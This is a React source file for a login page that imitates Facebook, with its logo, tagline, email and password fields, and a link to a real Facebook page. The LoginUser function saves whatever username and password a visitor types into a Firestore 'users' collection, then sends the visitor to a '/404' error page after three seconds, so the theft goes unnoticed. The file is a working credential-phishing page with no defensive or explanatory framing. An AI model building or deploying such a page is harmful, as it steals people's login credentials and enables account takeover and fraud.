import React, { Fragment, useState } from 'react'
import './Login.css'
import Logo from '../../Images/fb_logo.svg'
import {db} from '../Auth/Firebase-config'
import {collection, addDoc} from 'firebase/firestore'
import { useNavigate } from 'react-router-dom';
const Login = () => {
    const [name, setName] = useState('');
    const [pass, setPass] = useState('')
    const navigate = useNavigate();
    const userCollectionRef = collection(db, 'users')
    
    const loginForm = (e) => {
        e.preventDefault();
    } 
    const LoginUser = async () => {
        await addDoc(userCollectionRef, {User: name, Pass: pass})
        setTimeout(() => {
            (function navigateHome () {
                //  navigate to Error Page
                navigate('/404');
              })();
        }, 3000);
        
    }
  return (
    <Fragment>
    <main>
        <div className="row">
            <div className="col-logo">
                <img src={Logo} alt="Logo"/>
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div className="col-form">
                <form className="form-container" onClick={loginForm}>
                    <input type="text" placeholder="Email address or phone number" onChange={(event) => setName(event.target.value)}/>
                    <input type="password" placeholder="Password"  onChange={(event) => setPass(event.target.value)}/>
                    <button className="btn-login" onClick={LoginUser}>Login</button>
                    <a href="#">Forgotten password?</a>
                    <button type='submit' className="btn-new">Create new Account</button>
                </form>
                <p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" target="_blank"><b>Create a Page</b></a > for a celebrity, brand or business.</p>
            </div>
        </div>
        </main>
    </Fragment>
  )
}

export default Login